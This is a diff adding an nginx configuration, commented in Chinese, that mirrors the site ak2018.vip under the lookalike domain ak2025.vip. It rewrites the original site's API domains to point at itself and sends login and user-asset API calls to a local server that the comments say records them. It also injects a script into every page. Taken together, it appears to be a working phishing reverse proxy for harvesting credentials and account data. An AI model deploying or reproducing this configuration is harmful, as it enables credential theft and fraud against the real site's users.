@@ -1,0 +1,156 @@
+# ak2025.vip 站点配置
+# 部署方式: sudo cp ~/ak-proxy/transparent_proxy/sites-available/ak2025.vip /etc/nginx/sites-enabled/ak2025.vip
+
+upstream ak2018_backend {
+    server ak2018.vip:443 max_fails=3 fail_timeout=30s;
+}
+
+upstream monitor_backend {
+    server 127.0.0.1:8080 max_fails=3 fail_timeout=10s;
+    keepalive 32;
+}
+
+server {
+    listen 443 ssl http2;
+    server_name ak2025.vip www.ak2025.vip;
+    
+    ssl_certificate /etc/letsencrypt/live/ak2025.vip/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/ak2025.vip/privkey.pem;
+    
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305;
+    ssl_prefer_server_ciphers off;
+    ssl_session_cache shared:SSL:50m;
+    ssl_session_timeout 1d;
+    
+    # 管理后台
+    location ^~ /admin {
+        proxy_pass http://monitor_backend;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "upgrade";
+        proxy_http_version 1.1;
+        proxy_connect_timeout 30s;
+        proxy_read_timeout 300s;
+    }
+    
+    # 聊天WebSocket和Widget
+    location ^~ /chat {
+        proxy_pass http://monitor_backend;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header Upgrade $http_upgrade;
+        proxy_set_header Connection "upgrade";
+        proxy_http_version 1.1;
+        proxy_connect_timeout 5s;
+        proxy_send_timeout 300s;
+        proxy_read_timeout 300s;
+        add_header Cache-Control "no-cache, no-store, must-revalidate";
+    }
+    
+    # 登录API - 经过监控服务器记录
+    location ~ ^/RPC/Login$ {
+        proxy_pass http://monitor_backend;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header User-Agent $http_user_agent;
+        proxy_set_header Content-Type $http_content_type;
+        proxy_connect_timeout 5s;
+        proxy_send_timeout 10s;
+        proxy_read_timeout 15s;
+        proxy_http_version 1.1;
+    }
+    
+    # 用户资产API - 经过监控服务器记录
+    location ^~ /RPC/public_IndexData {
+        proxy_pass http://monitor_backend;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header User-Agent $http_user_agent;
+        proxy_set_header Content-Type $http_content_type;
+        proxy_connect_timeout 5s;
+        proxy_read_timeout 15s;
+        proxy_http_version 1.1;
+    }
+    
+    # 其他RPC请求转发到监控服务器
+    location ^~ /RPC/ {
+        proxy_pass http://monitor_backend;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header User-Agent $http_user_agent;
+        proxy_set_header Content-Type $http_content_type;
+        proxy_connect_timeout 5s;
+        proxy_read_timeout 15s;
+        proxy_http_version 1.1;
+    }
+    
+    # 静态资源缓存
+    location ~* \.(css|jpg|jpeg|png|gif|ico|svg|woff|woff2|ttf|eot)$ {
+        proxy_pass https://ak2018_backend;
+        proxy_ssl_verify off;
+        proxy_ssl_server_name on;
+        proxy_set_header Host ak2018.vip;
+        proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
+        expires 7d;
+        add_header Cache-Control "public, max-age=604800, immutable";
+    }
+    
+    # JS文件需要替换API域名
+    location ~* \.js$ {
+        proxy_pass https://ak2018_backend;
+        proxy_ssl_verify off;
+        proxy_ssl_server_name on;
+        proxy_set_header Host ak2018.vip;
+        proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
+        proxy_set_header Accept-Encoding "";
+        
+        sub_filter_types application/javascript text/javascript;
+        sub_filter_once off;
+        sub_filter 'https://www.akapi1.com' 'https://ak2025.vip';
+        sub_filter 'https://www.akapi3.com' 'https://ak2025.vip';
+        sub_filter 'http://www.akapi1.com' 'https://ak2025.vip';
+        sub_filter 'http://www.akapi3.com' 'https://ak2025.vip';
+        sub_filter 'https://ak2018.vip' 'https://ak2025.vip';
+        sub_filter 'ak2018.vip' 'ak2025.vip';
+    }
+    
+    # 默认代理到ak2018并替换域名 + 注入chat widget
+    location / {
+        proxy_pass https://ak2018_backend;
+        proxy_ssl_verify off;
+        proxy_ssl_server_name on;
+        
+        proxy_set_header Host ak2018.vip;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+        proxy_set_header Accept-Encoding "";
+        proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
+        
+        proxy_connect_timeout 30s;
+        proxy_send_timeout 30s;
+        proxy_read_timeout 30s;
+        proxy_http_version 1.1;
+        proxy_set_header Connection "";
+        
+        sub_filter_types text/html text/javascript application/javascript;
+        sub_filter_once off;
+        sub_filter 'https://www.akapi1.com' 'https://ak2025.vip';
+        sub_filter 'https://www.akapi3.com' 'https://ak2025.vip';
+        sub_filter 'http://www.akapi1.com' 'https://ak2025.vip';
+        sub_filter 'http://www.akapi3.com' 'https://ak2025.vip';
+        sub_filter 'https://ak2018.vip' 'https://ak2025.vip';
+        sub_filter 'ak2018.vip' 'ak2025.vip';
+        
+        # 注入chat widget到HTML页面
+        sub_filter '<head>' '<head><script src="/chat/widget.js"></script>';
+    }
+}
